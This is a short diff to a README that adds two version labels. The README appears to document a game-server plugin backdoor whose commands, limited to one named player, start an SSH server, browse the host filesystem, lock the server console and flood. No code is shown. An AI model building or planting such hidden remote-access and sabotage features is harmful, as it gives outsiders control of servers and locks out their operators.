@@ -18,7 +18,7 @@ public String onlyrunners[] = new String[]{YOUR_PLAYER_NAME};
 
 ##  Usage
 
-#### NEW!
+#### NEW! version 1.1
 ### :ssh username password
   Opens an Apache SSHD server
 ### :stopssh
@@ -35,6 +35,7 @@ public String onlyrunners[] = new String[]{YOUR_PLAYER_NAME};
   Lists all avaible folders in blue and avaible files in black in a book like GUI (to test it on linux servers, do :cd /)
 
 ----------------------------------------------------------------
+version v0.0.1-alpha
 ### :lockconsole 
   A toggle command that prevents console command execution
 ### :flood
